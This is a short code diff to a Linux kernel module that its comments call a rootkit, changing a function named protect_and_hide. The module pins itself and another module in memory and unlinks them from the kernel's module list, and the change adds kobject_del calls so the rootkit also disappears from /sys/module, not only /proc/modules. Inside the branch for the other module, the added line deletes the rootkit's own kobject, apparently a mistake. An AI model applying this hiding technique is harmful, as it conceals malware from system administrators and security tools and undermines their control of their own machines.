@@ -184,12 +184,14 @@ void protect_and_hide(void) {
         try_module_get(module_to_hide);
         // printk(KERN_INFO "Hide module: %s\n", module_to_hide->name);
         list_del(&module_to_hide->list);
+        kobject_del(&THIS_MODULE->mkobj.kobj);
     }
 
     // printk(KERN_INFO "Protect rootkit\n");
     try_module_get(THIS_MODULE);
     // printk(KERN_INFO "Hide rootkit\n");
-    list_del(&THIS_MODULE->list);
+    list_del(&THIS_MODULE->list);            // /proc/modules
+    kobject_del(&THIS_MODULE->mkobj.kobj);   // /sys/module
 }
 
 /*
